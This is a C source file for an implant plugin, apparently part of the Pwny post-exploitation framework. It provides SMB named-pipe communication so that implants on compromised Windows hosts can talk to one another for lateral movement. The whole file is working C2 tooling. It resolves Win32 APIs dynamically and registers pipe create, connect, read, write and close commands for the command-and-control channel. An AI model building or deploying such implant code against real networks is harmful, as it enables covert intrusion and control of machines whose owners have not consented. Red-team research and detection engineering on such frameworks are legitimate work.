/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * SMB Pipe COT plugin — named pipe communication for lateral movement.
 *
 * Provides:
 *   - Create a named pipe server (listen)
 *   - Connect to a remote named pipe (client)
 *   - Read / Write / Close operations
 *
 * Named pipes work over SMB, enabling communication to other machines
 * in the domain without opening new TCP ports.
 *
 * Typical flow:
 *   1. Create pipe on compromised_host: \\.\pipe\pwny_comms
 *   2. From another implant, connect to: \\compromised_host\pipe\pwny_comms
 *   3. Exchange data bidirectionally
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

#define SMBPIPE_CREATE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)

#define SMBPIPE_CONNECT \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 1)

#define SMBPIPE_READ \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 2)

#define SMBPIPE_WRITE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 3)

#define SMBPIPE_CLOSE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 4)

/* TLV types */
#define TLV_TYPE_PIPE_NAME  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_PIPE_HOST  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_PIPE_DATA  TLV_TYPE_CUSTOM(TLV_TYPE_BYTES,  TAB_BASE, API_TYPE)
#define TLV_TYPE_PIPE_LEN   TLV_TYPE_CUSTOM(TLV_TYPE_INT,    TAB_BASE, API_TYPE)
#define TLV_TYPE_PIPE_ID    TLV_TYPE_CUSTOM(TLV_TYPE_INT,    TAB_BASE, API_TYPE + 1)

/* ------------------------------------------------------------------ */
/* Win32 function pointer types                                        */
/* ------------------------------------------------------------------ */

typedef HANDLE (WINAPI *fn_CreateNamedPipeA)(LPCSTR, DWORD, DWORD, DWORD,
                                              DWORD, DWORD, DWORD,
                                              LPSECURITY_ATTRIBUTES);
typedef BOOL   (WINAPI *fn_ConnectNamedPipe)(HANDLE, LPOVERLAPPED);
typedef HANDLE (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD,
                                         LPSECURITY_ATTRIBUTES,
                                         DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD,
                                      LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD,
                                       LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_CloseHandle)(HANDLE);
typedef BOOL   (WINAPI *fn_DisconnectNamedPipe)(HANDLE);

static struct
{
    fn_CreateNamedPipeA    pCreateNamedPipeA;
    fn_ConnectNamedPipe    pConnectNamedPipe;
    fn_CreateFileA         pCreateFileA;
    fn_ReadFile            pReadFile;
    fn_WriteFile           pWriteFile;
    fn_CloseHandle         pCloseHandle;
    fn_DisconnectNamedPipe pDisconnectNamedPipe;
} w;

/* ------------------------------------------------------------------ */
/* Pipe handle table                                                   */
/* ------------------------------------------------------------------ */

#define MAX_PIPES 16

static struct
{
    HANDLE handle;
    int active;
} pipe_table[MAX_PIPES];

static int pipe_alloc(HANDLE h)
{
    int i;
    for (i = 0; i < MAX_PIPES; i++)
    {
        if (!pipe_table[i].active)
        {
            pipe_table[i].handle = h;
            pipe_table[i].active = 1;
            return i;
        }
    }
    return -1;
}

static HANDLE pipe_get(int id)
{
    if (id < 0 || id >= MAX_PIPES || !pipe_table[id].active)
        return INVALID_HANDLE_VALUE;
    return pipe_table[id].handle;
}

static void pipe_free(int id)
{
    if (id >= 0 && id < MAX_PIPES)
    {
        pipe_table[id].active = 0;
        pipe_table[id].handle = INVALID_HANDLE_VALUE;
    }
}

/* ------------------------------------------------------------------ */
/* Create named pipe (server side)                                     */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *smbpipe_create(c2_t *c2)
{
    char name[512];
    char pipe_name[512];
    HANDLE hPipe;
    int id;
    tlv_pkt_t *result;
    int i;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_PIPE_NAME, name) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    /* Build full pipe path: \\.\pipe\<name> */
    {
        const char *prefix = "\\\\.\\pipe\\";
        i = 0;
        while (*prefix) pipe_name[i++] = *prefix++;
        {
            const char *p = name;
            while (*p && i < 500) pipe_name[i++] = *p++;
        }
        pipe_name[i] = '\0';
    }

    /* Create the named pipe */
    hPipe = w.pCreateNamedPipeA(
        pipe_name,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        65536,  /* out buffer size */
        65536,  /* in buffer size */
        0,      /* default timeout */
        NULL);  /* default security */

    if (hPipe == INVALID_HANDLE_VALUE)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Wait for client connection (blocking) */
    if (!w.pConnectNamedPipe(hPipe, NULL))
    {
        DWORD err = 0; /* ERROR_PIPE_CONNECTED is OK */
        /* If client already connected before ConnectNamedPipe,
           GetLastError returns ERROR_PIPE_CONNECTED — that's fine */
    }

    id = pipe_alloc(hPipe);
    if (id < 0)
    {
        w.pDisconnectNamedPipe(hPipe);
        w.pCloseHandle(hPipe);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, id);
    return result;
}

/* ------------------------------------------------------------------ */
/* Connect to a remote named pipe (client side)                        */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *smbpipe_connect(c2_t *c2)
{
    char host[256];
    char name[256];
    char pipe_path[512];
    HANDLE hPipe;
    int id;
    int i;
    tlv_pkt_t *result;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_PIPE_HOST, host) < 0 ||
        tlv_pkt_get_string(c2->request, TLV_TYPE_PIPE_NAME, name) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    /* Build UNC pipe path: \\host\pipe\name */
    i = 0;
    pipe_path[i++] = '\\';
    pipe_path[i++] = '\\';
    {
        const char *p = host;
        while (*p && i < 300) pipe_path[i++] = *p++;
    }
    {
        const char *suffix = "\\pipe\\";
        while (*suffix) pipe_path[i++] = *suffix++;
    }
    {
        const char *p = name;
        while (*p && i < 500) pipe_path[i++] = *p++;
    }
    pipe_path[i] = '\0';

    hPipe = w.pCreateFileA(pipe_path,
                            GENERIC_READ | GENERIC_WRITE,
                            0, NULL, OPEN_EXISTING, 0, NULL);

    if (hPipe == INVALID_HANDLE_VALUE)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    id = pipe_alloc(hPipe);
    if (id < 0)
    {
        w.pCloseHandle(hPipe);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, id);
    return result;
}

/* ------------------------------------------------------------------ */
/* Read from pipe                                                      */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *smbpipe_read(c2_t *c2)
{
    int id;
    int length;
    HANDLE hPipe;
    unsigned char *buf;
    DWORD bytes_read = 0;
    tlv_pkt_t *result;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_ID, &id) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_LEN, &length) < 0)
        length = 4096;

    hPipe = pipe_get(id);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    buf = (unsigned char *)malloc(length);
    if (buf == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!w.pReadFile(hPipe, buf, (DWORD)length, &bytes_read, NULL))
    {
        free(buf);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_DATA, buf, bytes_read);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_LEN, (int)bytes_read);

    free(buf);
    return result;
}

/* ------------------------------------------------------------------ */
/* Write to pipe                                                       */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *smbpipe_write(c2_t *c2)
{
    int id;
    HANDLE hPipe;
    unsigned char *data;
    ssize_t data_len;
    DWORD bytes_written = 0;
    tlv_pkt_t *result;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_ID, &id) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    hPipe = pipe_get(id);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    data_len = tlv_pkt_get_bytes(c2->request, TLV_TYPE_PIPE_DATA, &data);
    if (data_len <= 0 || data == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    if (!w.pWriteFile(hPipe, data, (DWORD)data_len, &bytes_written, NULL))
    {
        free(data);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    free(data);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_LEN, (int)bytes_written);
    return result;
}

/* ------------------------------------------------------------------ */
/* Close pipe                                                          */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *smbpipe_close(c2_t *c2)
{
    int id;
    HANDLE hPipe;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PIPE_ID, &id) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    hPipe = pipe_get(id);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    w.pDisconnectNamedPipe(hPipe);
    w.pCloseHandle(hPipe);
    pipe_free(id);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    int i;

    for (i = 0; i < MAX_PIPES; i++)
    {
        pipe_table[i].handle = INVALID_HANDLE_VALUE;
        pipe_table[i].active = 0;
    }

    w.pCreateNamedPipeA    = (fn_CreateNamedPipeA)cot_resolve("kernel32.dll",
                                                               "CreateNamedPipeA");
    w.pConnectNamedPipe    = (fn_ConnectNamedPipe)cot_resolve("kernel32.dll",
                                                               "ConnectNamedPipe");
    w.pCreateFileA         = (fn_CreateFileA)cot_resolve("kernel32.dll",
                                                          "CreateFileA");
    w.pReadFile            = (fn_ReadFile)cot_resolve("kernel32.dll",
                                                       "ReadFile");
    w.pWriteFile           = (fn_WriteFile)cot_resolve("kernel32.dll",
                                                        "WriteFile");
    w.pCloseHandle         = (fn_CloseHandle)cot_resolve("kernel32.dll",
                                                          "CloseHandle");
    w.pDisconnectNamedPipe = (fn_DisconnectNamedPipe)cot_resolve("kernel32.dll",
                                                                   "DisconnectNamedPipe");

    api_call_register(api_calls, SMBPIPE_CREATE,  (api_t)smbpipe_create);
    api_call_register(api_calls, SMBPIPE_CONNECT, (api_t)smbpipe_connect);
    api_call_register(api_calls, SMBPIPE_READ,    (api_t)smbpipe_read);
    api_call_register(api_calls, SMBPIPE_WRITE,   (api_t)smbpipe_write);
    api_call_register(api_calls, SMBPIPE_CLOSE,   (api_t)smbpipe_close);
}

#endif
